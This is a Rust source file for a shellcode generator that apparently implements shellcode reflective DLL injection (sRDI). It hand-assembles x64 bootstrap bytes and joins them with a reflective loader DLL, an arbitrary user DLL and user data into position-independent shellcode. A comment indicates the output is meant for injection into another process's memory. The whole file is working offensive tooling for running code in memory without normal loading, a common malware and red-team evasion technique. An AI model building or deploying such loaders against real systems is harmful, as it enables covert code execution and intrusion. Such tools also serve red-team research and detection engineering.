use std::{collections::BTreeMap, ffi::CStr};
use std::{
    env,
    fs::{self},
};
use windows_sys::Win32::System::{
    Diagnostics::Debug::{
        IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_NT_HEADERS64, IMAGE_NT_OPTIONAL_HDR64_MAGIC,
        IMAGE_SECTION_HEADER,
    },
    SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY},
};

const BOOTSTRAP_TOTAL_LENGTH: u32 = 79; // THIS NEEDS TO CHANGE IF THE SHELLCODE BELOW CHANGES
const REFLECTIVE_LOADER_NAME: &str = "reflective_loader"; // THIS NEEDS TO CHANGE IF THE REFLECTIVE LOADER FUNCTION NAME CHANGES

#[allow(dead_code)]
//const SRDI_CLEARHEADER: u32 = 0x1;
#[allow(dead_code)]
const SRDI_CLEARMEMORY: u32 = 0x2;

#[allow(dead_code)]
//const SRDI_OBFUSCATEIMPORTS: u32 = 0x4;
#[allow(dead_code)]
//const SRDI_PASS_SHELLCODE_BASE: u32 = 0x8;

fn main() {
    env_logger::init();

    let args: Vec<String> = env::args().collect();

    if args.len() < 5 {
        println!("Usage: generate_shellcode.exe <reflective loader dll path> <user dll path> <user function> <user data> <shellcode outfile path>");
        println!("Example: generate_shellcode.exe reflective_loader.dll testdll.dll SayHello memN0ps shellcode.bin");
        std::process::exit(1);
    }

    let reflective_loader_path = &args[1];
    let user_dll_path = &args[2];
    let user_function = &args[3];
    let user_data = &args[4];
    let shellcode_output_path = &args[5];

    let mut reflective_loader_bytes =
        std::fs::read(reflective_loader_path).expect("Failed to read reflective loader path");

    let mut user_dll = std::fs::read(user_dll_path).expect("Failed to read user dll path");
    let user_dll_size = user_dll.len();

    let user_function_hash = hash(user_function.as_bytes()); // TODO: Take this as user input
    log::debug!(
        "[+] User function hash: {:#x} and user data {}",
        user_function_hash,
        user_data
    );

    let final_shellcode = convert_to_shellcode(
        &mut user_dll,
        user_dll_size,
        user_function_hash,
        user_data,
        user_data.len() as _,
        SRDI_CLEARMEMORY,
        &mut reflective_loader_bytes,
    );

    fs::write(shellcode_output_path, final_shellcode)
        .expect("[-] Failed to write the final shellcode to a file");
    log::debug!("PIC shellcode file path: {}", shellcode_output_path);
}

//credits: monoxgas
fn convert_to_shellcode(
    dll_bytes: &mut Vec<u8>,
    dll_length: usize,
    user_function: u32,
    user_data: &str,
    user_data_length: u32,
    flags: u32,
    reflective_loader_bytes: &mut Vec<u8>,
) -> Vec<u8> {
    let reflective_loader_ptr = reflective_loader_bytes.as_mut_ptr();
    let reflective_loader_size = reflective_loader_bytes.len();

    // Get the reflective loader address in memory
    let loader_address =
        get_exports_by_name(reflective_loader_ptr, REFLECTIVE_LOADER_NAME.to_owned())
            .expect("Failed to find export");

    // Calculate the reflective loader offset
    let reflective_loader_offset = loader_address as usize - reflective_loader_ptr as usize; // module_base minus to get the offset
    log::debug!(
        "[+] Reflective Loader Offset: {:#x}",
        reflective_loader_offset
    );

    if !is_64_dll(dll_bytes.as_mut_ptr() as _) {
        panic!("[-] The file is not a 64 bit dll");
    }

    let mut bootstrap: Vec<u8> = Vec::new();

    //
    // Step 1) Save the current location in memory for calculating addresses.
    //

    // call 0x00 (This will push the address of the next function to the stack)
    bootstrap.push(0xe8);
    bootstrap.push(0x00);
    bootstrap.push(0x00);
    bootstrap.push(0x00);
    bootstrap.push(0x00);

    // pop rcx - This will pop the value we saved on the stack into rcx to capture our current location in memory
    bootstrap.push(0x59);

    // mov r8, rcx - We copy the value of rcx into r8 before we start modifying RCX
    bootstrap.push(0x49);
    bootstrap.push(0x89);
    bootstrap.push(0xc8);

    //
    // Step 2) Align the stack and create shadow space
    //

    // push rsi - save original value
    bootstrap.push(0x56);

    // mov rsi, rsp - store our current stack pointer for later
    bootstrap.push(0x48);
    bootstrap.push(0x89);
    bootstrap.push(0xe6);

    // and rsp, 0x0FFFFFFFFFFFFFFF0 - Align the stack to 16 bytes
    bootstrap.push(0x48);
    bootstrap.push(0x83);
    bootstrap.push(0xe4);
    bootstrap.push(0xf0);

    // sub rsp, 0x30 (48 bytes) - create shadow space on the stack, which is required for x64. A minimum of 32 bytes for rcx, rdx, r8, r9. Then other params on stack
    bootstrap.push(0x48);
    bootstrap.push(0x83);
    bootstrap.push(0xec);
    bootstrap.push(6 * 8); //6 args that are 8 bytes each

    //
    // Step 3) Setup reflective loader parameters: Place the last 5th and 6th args on the stack since, rcx, rdx, r8, r9 are already in use for our first 4 args.
    //

    // mov qword ptr [rsp + 0x20], rcx (shellcode base + 5 bytes) - (32 bytes) Push in arg 5
    bootstrap.push(0x48);
    bootstrap.push(0x89);
    bootstrap.push(0x4C);
    bootstrap.push(0x24);
    bootstrap.push(4 * 8); // 5th arg

    // sub qword ptr [rsp + 0x20], 0x5 (shellcode base) - modify the 5th arg to get the real shellcode base
    bootstrap.push(0x48);
    bootstrap.push(0x83);
    bootstrap.push(0x6C);
    bootstrap.push(0x24);
    bootstrap.push(4 * 8); // 5th arg
    bootstrap.push(5); // minus 5 bytes because call 0x00 is 5 bytes to get the allocate memory from VirtualAllocEx from injector

    // mov dword ptr [rsp + 0x28], <flags> - (40 bytes) Push arg 6 just above shadow space
    bootstrap.push(0xC7);
    bootstrap.push(0x44);
    bootstrap.push(0x24);
    bootstrap.push(5 * 8); // 6th arg
    bootstrap.append(&mut flags.to_le_bytes().to_vec().clone());

    //
    // Step 4) Setup reflective loader parameters: Place the 1st, 2nd, 3rd and 4th args in rcx, rdx, r8, r9
    //

    // mov r9, <length of user data> - copy the 4th parameter, which is the length of the user data into r9
    bootstrap.push(0x41);
    bootstrap.push(0xb9);
    bootstrap.append(&mut user_data_length.to_le_bytes().to_vec().clone());

    // add r8, <user function offset> + <length of DLL> - copy the 3rd parameter, which is address of the user function into r8 after calculation
    bootstrap.push(0x49);
    bootstrap.push(0x81);
    bootstrap.push(0xc0);
    let user_data_offset =
        (BOOTSTRAP_TOTAL_LENGTH - 5) as u32 + reflective_loader_size as u32 + dll_length as u32;
    bootstrap.append(&mut user_data_offset.to_le_bytes().to_vec().clone());

    // mov edx, <hash of function> - copy the 2nd parameter, which is the hash of the user function into edx
    bootstrap.push(0xba);
    bootstrap.append(&mut user_function.to_le_bytes().to_vec().clone());

    // add rcx, <offset of dll> - copy the 1st parameter, which is the address of the user dll into rcx after calculation
    bootstrap.push(0x48);
    bootstrap.push(0x81);
    bootstrap.push(0xc1);
    let dll_offset = (BOOTSTRAP_TOTAL_LENGTH - 5) as u32 + reflective_loader_size as u32;
    bootstrap.append(&mut dll_offset.to_le_bytes().to_vec().clone());

    //
    // Step 5) Call reflective loader function
    //

    // call <reflective loader address> - call the reflective loader address after calculation
    bootstrap.push(0xe8);
    let reflective_loader_address = (BOOTSTRAP_TOTAL_LENGTH - bootstrap.len() as u32 - 4 as u32)
        + reflective_loader_offset as u32;
    bootstrap.append(&mut reflective_loader_address.to_le_bytes().to_vec().clone());

    //padding
    bootstrap.push(0x90);
    bootstrap.push(0x90);

    //
    // Step 6) Reset the stack to how it was and return to the caller
    //

    // mov rsp, rsi - Reset our original stack pointer
    bootstrap.push(0x48);
    bootstrap.push(0x89);
    bootstrap.push(0xf4);

    // pop rsi - Put things back where we left them
    bootstrap.push(0x5e);

    // ret - return to caller and resume execution flow (avoids crashing process)
    bootstrap.push(0xc3);

    // padding
    bootstrap.push(0x90);
    bootstrap.push(0x90);

    log::debug!("[+] Bootstrap Shellcode Length: {}", bootstrap.len());

    let mut final_shellcode: Vec<u8> = Vec::new();

    // Bootstrap Shellcode
    final_shellcode.append(&mut bootstrap);

    // Reflective DLL
    final_shellcode.append(reflective_loader_bytes);

    // User DLL
    final_shellcode.append(dll_bytes);

    // User Data
    final_shellcode.append(&mut user_data.as_bytes().to_vec());

    return final_shellcode;
}

fn is_64_dll(module_base: usize) -> bool {
    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers = unsafe {
        (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32
    };
    #[cfg(target_arch = "x86_64")]
    let nt_headers = unsafe {
        (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64
    };

    if unsafe { (*nt_headers).OptionalHeader.Magic } == IMAGE_NT_OPTIONAL_HDR64_MAGIC {
        //PE64
        return true;
    }

    return false;
}

//credits: janoglezcampos / @httpyxel / yxel
pub const fn hash(buffer: &[u8]) -> u32 {
    let mut hsh: u32 = 5381;
    let mut iter: usize = 0;
    let mut cur: u8;

    while iter < buffer.len() {
        cur = buffer[iter];
        if cur == 0 {
            iter += 1;
            continue;
        }
        if cur >= ('a' as u8) {
            cur -= 0x20;
        }
        hsh = ((hsh << 5).wrapping_add(hsh)) + cur as u32;
        iter += 1;
    }
    return hsh;
}

/// Gets exports by name
pub fn get_exports_by_name(module_base: *mut u8, module_name: String) -> Option<*mut u8> {
    // loop through the module exports to find export by name
    for (name, addr) in unsafe { get_module_exports(module_base) } {
        if name == module_name {
            return Some(addr as _);
        }
    }
    return None;
}

/// Retrieves all functions and addresses from the specfied module
pub unsafe fn get_module_exports(module_base: *mut u8) -> BTreeMap<String, usize> {
    let mut exports = BTreeMap::new();

    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
        panic!("[-] Failed to get DOS header");
    }

    #[cfg(target_arch = "x86")]
    let nt_headers =
        (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;

    #[cfg(target_arch = "x86_64")]
    let nt_header =
        (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    let export_directory = rva_to_file_offset_pointer(
        module_base as usize,
        (*nt_header).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
            .VirtualAddress as u32,
    ) as *mut IMAGE_EXPORT_DIRECTORY;

    let names = core::slice::from_raw_parts(
        rva_to_file_offset_pointer(module_base as usize, (*export_directory).AddressOfNames)
            as *const u32,
        (*export_directory).NumberOfNames as _,
    );

    let functions = core::slice::from_raw_parts(
        rva_to_file_offset_pointer(module_base as usize, (*export_directory).AddressOfFunctions)
            as *const u32,
        (*export_directory).NumberOfFunctions as _,
    );

    let ordinals = core::slice::from_raw_parts(
        rva_to_file_offset_pointer(
            module_base as usize,
            (*export_directory).AddressOfNameOrdinals,
        ) as *const u16,
        (*export_directory).NumberOfNames as _,
    );

    for i in 0..(*export_directory).NumberOfNames {
        let name = rva_to_file_offset_pointer(module_base as usize, names[i as usize]) as *const i8;

        if let Ok(name) = CStr::from_ptr(name).to_str() {
            let ordinal = ordinals[i as usize] as usize;
            exports.insert(
                name.to_string(),
                rva_to_file_offset_pointer(module_base as usize, functions[ordinal]),
            );
        }
    }
    exports
}

/// get the Relative Virtual Address to file offset pointer
pub unsafe fn rva_to_file_offset_pointer(module_base: usize, mut rva: u32) -> usize {
    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers =
        (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;
    #[cfg(target_arch = "x86_64")]
    let nt_headers =
        (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    let ref_nt_headers = &*nt_headers;

    let section_header = ((&ref_nt_headers.OptionalHeader as *const _ as usize)
        + (ref_nt_headers.FileHeader.SizeOfOptionalHeader as usize))
        as *mut IMAGE_SECTION_HEADER;

    let number_of_sections = (*nt_headers).FileHeader.NumberOfSections;

    for i in 0..number_of_sections as usize {
        let virt_address = (*section_header.add(i)).VirtualAddress;
        let virt_size = (*section_header.add(i)).Misc.VirtualSize;

        if virt_address <= rva && virt_address + virt_size > rva {
            rva -= (*section_header.add(i)).VirtualAddress;
            rva += (*section_header.add(i)).PointerToRawData;

            return module_base + rva as usize;
        }
    }
    return 0;
}
